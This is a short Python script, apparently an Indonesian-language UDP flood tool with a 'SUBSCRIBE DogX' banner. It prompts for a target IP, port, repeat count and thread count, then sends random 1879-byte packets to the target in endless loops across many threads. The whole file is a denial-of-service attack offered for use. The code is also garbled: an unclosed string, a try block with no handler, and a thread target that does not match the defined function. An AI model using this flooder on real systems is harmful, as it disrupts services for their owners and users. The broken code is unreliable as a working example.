import time
import socket
import random
import threading

print("""
\033[93m
<< SUBSCRIBE DogX >>

ip = str(input("Masukan Ip Target:"))
port = int(input("Kaaih Port Kopi Target:"))
times = int(input("Times:"))
threads = int(input("threads:"))
def run():
	data = random._urandom(1879)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				# Threads
for y in range(threads):
	th = threading.Thread(target = wt)
	th.start()